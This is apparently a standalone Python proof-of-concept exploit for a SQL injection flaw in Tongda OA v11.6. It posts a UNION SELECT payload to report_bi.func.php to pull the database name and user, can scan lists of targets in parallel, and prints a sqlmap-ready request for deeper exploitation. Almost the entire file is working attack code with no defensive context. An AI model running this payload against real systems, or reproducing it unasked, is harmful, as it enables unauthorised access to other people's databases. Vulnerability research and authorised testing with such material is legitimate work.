import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data='''_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&'''
    exp_url=target_url+'general/bi_design/appcenter/report_bi.func.php'
    console.print(now_time() + " [INFO]     正在检测通达OA v11.6 insert SQL注入漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(exp_url, headers=headers, data=data, verify=False)
        if response.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  可能存在POST_sql注入漏洞', style='bold green')
            console.print(now_time() + ''' [SUCCESS]  使用sqlmap数据包做进一步验证:
                       POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
                       Host: #IP
                       User-Agent: Go-http-client/1.1
                       Content-Length: 113
                       Content-Type: application/x-www-form-urlencoded
                       Accept-Encoding: gzip

                       _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info& #注点
                       ''',style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  不存在通达OA v11.6 insert SQL注入漏洞', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    未知错误，无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            
            
            